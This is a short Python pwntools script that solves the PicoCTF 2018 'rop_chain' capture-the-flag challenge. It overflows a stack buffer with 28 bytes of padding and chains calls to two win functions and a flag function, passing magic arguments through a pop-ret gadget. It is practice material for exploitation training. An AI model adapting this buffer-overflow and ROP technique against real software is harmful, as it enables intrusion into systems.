from pwn import *

file_name = '/mnt/hgfs/Cyber Security PWN/buuoj/PicoCTF_2018_rop_chain'
host = 'node4.buuoj.cn'
port = 27966

# io = remote(host, port)
io = process([file_name])
elf = ELF(file_name)

exit_plt = p32(elf.plt['exit'])
gadget_pop_ret = p32(0x080485d6)
payload = b'A' * 28

# win_func1
win_func1 = p32(elf.symbols['win_function1'])  # 0x080485CB
payload += win_func1

# win_func2
a1 = -1163220307
a1 = a1.to_bytes(4, 'little', signed=True)
win_func2 = p32(elf.symbols['win_function2'])  # 0x080485D8
payload += win_func2 + gadget_pop_ret + a1

# flag
a1 = -559039827
a1 = a1.to_bytes(4, 'little', signed=True)
flag_func = p32(elf.symbols['flag'])
payload += flag_func + gadget_pop_ret + a1

io.sendline(payload)

print(io.recv())
print(io.recv())
